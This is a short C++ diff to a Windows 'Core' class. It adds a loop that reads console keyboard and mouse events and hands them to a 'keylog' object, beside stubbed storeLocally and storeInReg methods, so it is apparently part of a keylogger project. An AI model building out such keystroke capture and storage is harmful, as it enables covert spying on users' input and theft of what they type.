@@ -12,6 +12,8 @@
 
 Core::Core()
 {
+	hIn = GetStdHandle(STD_INPUT_HANDLE);
+	hOut = GetStdHandle(STD_OUTPUT_HANDLE);
 }
 
 Core::~Core()
@@ -30,5 +32,31 @@ int	Core::storeInReg(const std::string &msg)
 
 int	Core::storeLocally(const std::string &msg)
 {
+	return (0);
+}
+
+int	Core::run()
+{
+	bool Continue = TRUE;
+
+	while (Continue)
+	{
+		ReadConsoleInput(hIn,
+			&InRec,
+			1,
+			&NumRead);
+
+		switch (InRec.EventType)
+		{
+		case KEY_EVENT:
+			if (keylog.getKey(InRec) == 1)
+				Continue = FALSE;
+			break;
+
+		case MOUSE_EVENT:
+			keylog.getMouse();
+			break;
+		}
+	}
 	return (0);
 }
